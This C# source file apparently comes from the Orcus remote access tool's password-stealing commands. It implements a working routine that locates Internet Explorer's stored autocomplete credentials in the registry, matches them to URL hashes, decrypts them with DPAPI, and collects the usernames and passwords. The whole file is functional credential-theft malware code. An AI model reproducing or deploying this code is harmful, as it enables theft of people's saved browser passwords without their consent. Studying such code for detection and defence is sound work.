using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using Orcus.Native;

namespace Orcus.Commands.Passwords.Applications.InternetExplorer
{
    internal static class CryptoApi
    {
        private const string KeyStr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

        public static bool DecryptIePassword(string url, List<string[]> dataList)
        {
            //Get the hash for the passed URL
            string urlHash = GetUrlHashString(url);

            //Check if this hash matches with stored hash in registry
            if (!DoesUrlMatchWithHash(urlHash))
                return false;

            //Now retrieve the encrypted credentials for this registry hash entry....
            RegistryKey key = Registry.CurrentUser.OpenSubKey(KeyStr);
            if (key == null)
                return false;

            //Retrieve encrypted data for this website hash...
            //First get the value...
            byte[] cypherBytes = (byte[]) key.GetValue(urlHash);
            key.Close();

            // to use URL as optional entropy we must include trailing null character
            byte[] optionalEntropy = new byte[2*(url.Length + 1)];
            Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length*2);

            //Now decrypt the Autocomplete credentials....
            byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy,
                DataProtectionScope.CurrentUser);

            var ieAutoHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>(decryptedBytes);

            //check if the data contains enough length....
            if (decryptedBytes.Length >=
                ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize)
            {
                //Get the total number of secret entries (username & password) for the site...
                // user name and passwords are accounted as separate secrets, but will be threated in pairs here.
                uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets/2;

                int sizeOfSecretEntry = Marshal.SizeOf(typeof (SecretEntry));
                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize];
                int offset = (int) (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize);
                Buffer.BlockCopy(decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length);

                if (dataList == null)
                    dataList = new List<string[]>();
                else
                    dataList.Clear();

                offset = Marshal.SizeOf(ieAutoHeader);
                // Each time process 2 secret entries for username & password
                for (int i = 0; i < dwTotalSecrets; i++)
                {
                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry];
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);

                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);

                    string[] dataTriplet = new string[3];
                    // store data such as url, username & password for each secret 

                    byte[] secret1 = new byte[secEntry.dwLength*2];
                    Buffer.BlockCopy(secretsBuffer, (int) secEntry.dwOffset, secret1, 0, secret1.Length);

                    dataTriplet[0] = Encoding.Unicode.GetString(secret1);

                    // read another secret entry
                    offset += sizeOfSecretEntry;
                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
                    secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);

                    byte[] secret2 = new byte[secEntry.dwLength*2]; //Get the next secret's offset i.e password
                    Buffer.BlockCopy(secretsBuffer, (int) secEntry.dwOffset, secret2, 0, secret2.Length);

                    dataTriplet[1] = Encoding.Unicode.GetString(secret2);

                    dataTriplet[2] = urlHash;
                    //move to next entry
                    dataList.Add(dataTriplet);
                    offset += sizeOfSecretEntry;
                }
            }
            return true;
        } //End of function

        private static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T stuff = (T) Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof (T));
            handle.Free();
            return stuff;
        }

        private static string GetUrlHashString(string wstrUrl)
        {
            IntPtr hProv;
            IntPtr hHash = IntPtr.Zero;

            NativeMethods.CryptAcquireContext(out hProv, String.Empty, string.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

            if (!NativeMethods.CryptCreateHash(hProv, ALG.ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref hHash))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrUrl);

            StringBuilder urlHash = new StringBuilder(42);
            if (NativeMethods.CryptHashData(hHash, bytesToCrypt, (wstrUrl.Length + 1)*2, 0))
            {
                // retrieve 20 bytes of hash value
                uint dwHashLen = 20;
                byte[] buffer = new byte[dwHashLen];

                //Get the hash value now...
                if (!NativeMethods.CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                //Convert the 20 byte hash value to hexadecimal string format...
                byte tail = 0; // used to calculate value for the last 2 bytes
                urlHash.Length = 0;
                for (int i = 0; i < dwHashLen; ++i)
                {
                    byte c = buffer[i];
                    tail += c;
                    urlHash.AppendFormat("{0:X2}", c);
                }
                urlHash.AppendFormat("{0:X2}", tail);

                NativeMethods.CryptDestroyHash(hHash);
            }
            NativeMethods.CryptReleaseContext(hProv, 0);

            return urlHash.ToString();
        }

        private static bool DoesUrlMatchWithHash(string urlHash)
        {
            // enumerate values of the target registry
            bool result = false;
            RegistryKey key = Registry.CurrentUser.OpenSubKey(KeyStr);
            if (key == null)
                return false;

            string[] values = key.GetValueNames();
            foreach (string value in values)
            {
                // compare the value of the retrieved registry with the hash value of the history URL
                if (value == urlHash)
                {
                    result = true;
                    break;
                }
            }
            return result;
        }

        // ReSharper disable InconsistentNaming
        private const uint PROV_RSA_FULL = 1;
        private const uint CRYPT_VERIFYCONTEXT = 0xF0000000;
        // ReSharper restore InconsistentNaming
    }
}